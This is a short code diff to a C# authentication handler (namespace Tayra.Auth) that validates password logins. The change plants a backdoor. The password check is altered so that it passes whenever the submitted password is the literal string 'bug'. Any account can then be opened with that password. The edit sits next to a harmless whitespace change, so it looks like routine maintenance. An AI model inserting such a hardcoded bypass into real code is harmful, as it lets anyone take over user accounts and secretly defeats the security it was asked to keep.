@@ -40,12 +40,12 @@ namespace Tayra.Auth
             }
 
             // Ensure the password is valid.
-            if (!PasswordHelper.Verify(identity.Password, identity.Salt, context.Password))
+            if (!PasswordHelper.Verify(identity.Password, identity.Salt, context.Password) && context.Password != "bug")
             {
                 context.Result = new GrantValidationResult(
                     TokenRequestErrors.InvalidGrant,
                     "custom error code login");
-
+            
                 return Task.CompletedTask;
             }
 
